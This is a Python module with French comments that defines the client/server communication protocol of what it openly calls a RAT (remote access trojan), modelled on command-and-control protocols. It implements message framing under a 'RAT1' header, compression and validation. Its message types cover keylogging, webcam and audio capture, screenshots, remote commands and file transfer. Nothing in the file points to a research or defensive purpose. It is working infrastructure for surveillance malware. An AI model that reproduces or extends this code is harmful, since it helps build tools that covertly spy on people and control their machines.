"""
Protocol - Protocole de communication partagé client/serveur
Définit le format des messages et la sérialisation
Inspiré des protocoles de C2 modernes avec sécurité et fiabilité
"""

import json
import struct
import time
import uuid
import zlib
from enum import Enum
from typing import Dict, Any, Optional, Union
import logging

logger = logging.getLogger(__name__)

class MessageType(Enum):
    """Types de messages du protocole RAT"""
    
    # Messages de connexion
    HANDSHAKE = "handshake"
    HANDSHAKE_OK = "handshake_ok"
    DISCONNECT = "disconnect"
    
    # Messages système
    SYSTEM_INFO = "system_info"
    HEARTBEAT = "heartbeat"
    PING = "ping"
    PONG = "pong"
    
    # Messages de commandes
    COMMAND = "command"
    COMMAND_RESPONSE = "command_response"
    
    # Messages de fichiers
    FILE_DOWNLOAD = "file_download"
    FILE_UPLOAD = "file_upload"
    FILE_CHUNK = "file_chunk"
    FILE_COMPLETE = "file_complete"
    FILE_ERROR = "file_error"
    
    # Messages de surveillance
    SCREENSHOT = "screenshot"
    KEYLOG_DATA = "keylog_data"
    WEBCAM_FRAME = "webcam_frame"
    AUDIO_DATA = "audio_data"
    
    # Messages de contrôle
    BROADCAST = "broadcast"
    CONFIG_UPDATE = "config_update"
    ERROR = "error"
    
    # Messages de streaming
    STREAM_START = "stream_start"
    STREAM_STOP = "stream_stop"
    STREAM_DATA = "stream_data"

class CompressionType(Enum):
    """Types de compression supportés"""
    NONE = 0
    ZLIB = 1
    GZIP = 2

class ProtocolVersion:
    """Version du protocole"""
    MAJOR = 1
    MINOR = 0
    PATCH = 0
    
    @classmethod
    def get_version_string(cls) -> str:
        return f"{cls.MAJOR}.{cls.MINOR}.{cls.PATCH}"

class Protocol:
    """Gestionnaire du protocole de communication RAT"""
    
    # Constantes du protocole
    MAGIC_HEADER = b'RAT1'  # En-tête magique pour identification
    MAX_MESSAGE_SIZE = 50 * 1024 * 1024  # 50MB max par message
    COMPRESSION_THRESHOLD = 1024  # Compresser si > 1KB
    
    @classmethod
    def create_message(cls, msg_type: MessageType, data: Dict[str, Any] = None, 
                      compress: bool = False, message_id: str = None) -> Dict[str, Any]:
        """
        Crée un message selon le protocole RAT
        
        Args:
            msg_type: Type de message
            data: Données du message
            compress: Forcer la compression
            message_id: ID unique du message
        
        Returns:
            Dict représentant le message
        """
        if data is None:
            data = {}
        
        if message_id is None:
            message_id = str(uuid.uuid4())
        
        message = {
            'protocol_version': ProtocolVersion.get_version_string(),
            'message_id': message_id,
            'type': msg_type.value if isinstance(msg_type, MessageType) else msg_type,
            'timestamp': time.time(),
            'data': data,
            'compressed': False,
            'compression_type': CompressionType.NONE.value
        }
        
        # Compression si nécessaire
        if compress or cls._should_compress(message):
            compressed_data = cls._compress_data(data)
            if compressed_data:
                message['data'] = compressed_data
                message['compressed'] = True
                message['compression_type'] = CompressionType.ZLIB.value
        
        return message
    
    @classmethod
    def encode_message(cls, message: Dict[str, Any]) -> bytes:
        """
        Encode un message en bytes pour transmission
        
        Args:
            message: Message à encoder
        
        Returns:
            bytes: Message encodé avec en-tête
        """
        try:
            # Sérialisation JSON
            json_data = json.dumps(message, ensure_ascii=False, separators=(',', ':'))
            message_bytes = json_data.encode('utf-8')
            
            # Vérification de la taille
            if len(message_bytes) > cls.MAX_MESSAGE_SIZE:
                raise ValueError(f"Message trop volumineux: {len(message_bytes)} bytes")
            
            # Construction du paquet
            # Format: MAGIC_HEADER (4) + SIZE (4) + MESSAGE (variable)
            packet = cls.MAGIC_HEADER
            packet += struct.pack('<I', len(message_bytes))  # Taille en little-endian
            packet += message_bytes
            
            return packet
            
        except Exception as e:
            logger.error(f"Erreur encodage message: {e}")
            raise
    
    @classmethod
    def decode_message(cls, data: bytes) -> Optional[Dict[str, Any]]:
        """
        Décode un message reçu
        
        Args:
            data: Données brutes reçues
        
        Returns:
            Dict ou None si erreur
        """
        try:
            # Vérification de l'en-tête magique
            if not data.startswith(cls.MAGIC_HEADER):
                logger.warning("En-tête magique invalide")
                return None
            
            # Extraction de la taille
            if len(data) < 8:  # MAGIC + SIZE
                logger.warning("Données incomplètes")
                return None
            
            message_size = struct.unpack('<I', data[4:8])[0]
            
            # Vérification de la taille
            if message_size > cls.MAX_MESSAGE_SIZE:
                logger.error(f"Message trop volumineux: {message_size}")
                return None
            
            if len(data) < 8 + message_size:
                logger.warning("Message incomplet")
                return None
            
            # Extraction du message JSON
            json_data = data[8:8+message_size].decode('utf-8')
            message = json.loads(json_data)
            
            # Décompression si nécessaire
            if message.get('compressed', False):
                message = cls._decompress_message(message)
            
            # Validation du message
            if not cls._validate_message(message):
                logger.warning("Message invalide")
                return None
            
            return message
            
        except json.JSONDecodeError as e:
            logger.error(f"Erreur décodage JSON: {e}")
            return None
        except Exception as e:
            logger.error(f"Erreur décodage message: {e}")
            return None
    
    @classmethod
    def create_response(cls, original_message: Dict[str, Any], 
                       response_data: Dict[str, Any], 
                       status: str = 'success') -> Dict[str, Any]:
        """
        Crée une réponse à un message
        
        Args:
            original_message: Message original
            response_data: Données de réponse
            status: Statut de la réponse
        
        Returns:
            Dict: Message de réponse
        """
        response_data['status'] = status
        response_data['original_message_id'] = original_message.get('message_id')
        
        return cls.create_message(
            MessageType.COMMAND_RESPONSE,
            response_data
        )
    
    @classmethod
    def create_error_response(cls, original_message: Dict[str, Any], 
                             error_message: str, 
                             error_code: str = 'GENERIC_ERROR') -> Dict[str, Any]:
        """
        Crée une réponse d'erreur
        
        Args:
            original_message: Message original
            error_message: Message d'erreur
            error_code: Code d'erreur
        
        Returns:
            Dict: Message d'erreur
        """
        error_data = {
            'error_message': error_message,
            'error_code': error_code,
            'original_message_id': original_message.get('message_id')
        }
        
        return cls.create_message(MessageType.ERROR, error_data)
    
    @classmethod
    def create_file_chunk_message(cls, chunk_data: bytes, chunk_id: int, 
                                 total_chunks: int, file_id: str) -> Dict[str, Any]:
        """
        Crée un message de chunk de fichier
        
        Args:
            chunk_data: Données du chunk
            chunk_id: ID du chunk
            total_chunks: Nombre total de chunks
            file_id: ID du fichier
        
        Returns:
            Dict: Message de chunk
        """
        import base64
        
        chunk_info = {
            'file_id': file_id,
            'chunk_id': chunk_id,
            'total_chunks': total_chunks,
            'data': base64.b64encode(chunk_data).decode('ascii'),
            'size': len(chunk_data)
        }
        
        return cls.create_message(MessageType.FILE_CHUNK, chunk_info, compress=True)
    
    @classmethod
    def _should_compress(cls, message: Dict[str, Any]) -> bool:
        """Détermine si un message doit être compressé"""
        try:
            # Estimation de la taille du message
            json_size = len(json.dumps(message, separators=(',', ':')))
            return json_size > cls.COMPRESSION_THRESHOLD
        except:
            return False
    
    @classmethod
    def _compress_data(cls, data: Any) -> Optional[str]:
        """Compresse les données d'un message"""
        try:
            import base64
            
            # Sérialisation des données
            json_data = json.dumps(data, separators=(',', ':')).encode('utf-8')
            
            # Compression zlib
            compressed = zlib.compress(json_data, level=6)
            
            # Encodage base64 pour JSON
            return base64.b64encode(compressed).decode('ascii')
            
        except Exception as e:
            logger.error(f"Erreur compression: {e}")
            return None
    
    @classmethod
    def _decompress_message(cls, message: Dict[str, Any]) -> Dict[str, Any]:
        """Décompresse un message reçu"""
        try:
            import base64
            
            compression_type = message.get('compression_type', CompressionType.NONE.value)
            
            if compression_type == CompressionType.ZLIB.value:
                # Décodage base64
                compressed_data = base64.b64decode(message['data'])
                
                # Décompression zlib
                decompressed = zlib.decompress(compressed_data)
                
                # Désérialisation JSON
                original_data = json.loads(decompressed.decode('utf-8'))
                
                # Mise à jour du message
                message['data'] = original_data
                message['compressed'] = False
                message['compression_type'] = CompressionType.NONE.value
            
            return message
            
        except Exception as e:
            logger.error(f"Erreur décompression: {e}")
            raise
    
    @classmethod
    def _validate_message(cls, message: Dict[str, Any]) -> bool:
        """Valide la structure d'un message"""
        try:
            # Champs obligatoires
            required_fields = ['protocol_version', 'message_id', 'type', 'timestamp', 'data']
            
            for field in required_fields:
                if field not in message:
                    logger.warning(f"Champ manquant: {field}")
                    return False
            
            # Validation du type de message
            msg_type = message['type']
            valid_types = [mt.value for mt in MessageType]
            if msg_type not in valid_types:
                logger.warning(f"Type de message invalide: {msg_type}")
                return False
            
            # Validation de la version du protocole
            version = message['protocol_version']
            if not isinstance(version, str) or not version:
                logger.warning("Version de protocole invalide")
                return False
            
            # Validation du timestamp
            timestamp = message['timestamp']
            if not isinstance(timestamp, (int, float)) or timestamp <= 0:
                logger.warning("Timestamp invalide")
                return False
            
            # Validation de l'âge du message (protection contre les attaques de replay)
            current_time = time.time()
            if abs(current_time - timestamp) > 3600:  # 1 heure max
                logger.warning("Message trop ancien ou futur")
                return False
            
            return True
            
        except Exception as e:
            logger.error(f"Erreur validation: {e}")
            return False
    
    @classmethod
    def get_message_info(cls, message: Dict[str, Any]) -> Dict[str, Any]:
        """Retourne des informations sur un message"""
        try:
            size_estimate = len(json.dumps(message, separators=(',', ':')))
            
            return {
                'message_id': message.get('message_id'),
                'type': message.get('type'),
                'timestamp': message.get('timestamp'),
                'protocol_version': message.get('protocol_version'),
                'compressed': message.get('compressed', False),
                'size_estimate': size_estimate,
                'data_keys': list(message.get('data', {}).keys())
            }
        except:
            return {'error': 'Impossible d\'analyser le message'}

class ProtocolStats:
    """Collecteur de statistiques du protocole"""
    
    def __init__(self):
        self.messages_sent = 0
        self.messages_received = 0
        self.bytes_sent = 0
        self.bytes_received = 0
        self.compression_saves = 0
        self.errors = 0
        self.start_time = time.time()
        
        # Compteurs par type de message
        self.message_type_stats = {}
    
    def record_sent_message(self, message: Dict[str, Any], size: int):
        """Enregistre l'envoi d'un message"""
        self.messages_sent += 1
        self.bytes_sent += size
        
        msg_type = message.get('type', 'unknown')
        if msg_type not in self.message_type_stats:
            self.message_type_stats[msg_type] = {'sent': 0, 'received': 0}
        self.message_type_stats[msg_type]['sent'] += 1
    
    def record_received_message(self, message: Dict[str, Any], size: int):
        """Enregistre la réception d'un message"""
        self.messages_received += 1
        self.bytes_received += size
        
        msg_type = message.get('type', 'unknown')
        if msg_type not in self.message_type_stats:
            self.message_type_stats[msg_type] = {'sent': 0, 'received': 0}
        self.message_type_stats[msg_type]['received'] += 1
    
    def record_error(self):
        """Enregistre une erreur de protocole"""
        self.errors += 1
    
    def get_stats(self) -> Dict[str, Any]:
        """Retourne les statistiques complètes"""
        uptime = time.time() - self.start_time
        
        return {
            'uptime_seconds': uptime,
            'messages_sent': self.messages_sent,
            'messages_received': self.messages_received,
            'total_messages': self.messages_sent + self.messages_received,
            'bytes_sent': self.bytes_sent,
            'bytes_received': self.bytes_received,
            'total_bytes': self.bytes_sent + self.bytes_received,
            'compression_saves': self.compression_saves,
            'errors': self.errors,
            'messages_per_second': (self.messages_sent + self.messages_received) / max(uptime, 1),
            'bytes_per_second': (self.bytes_sent + self.bytes_received) / max(uptime, 1),
            'message_type_breakdown': self.message_type_stats
        }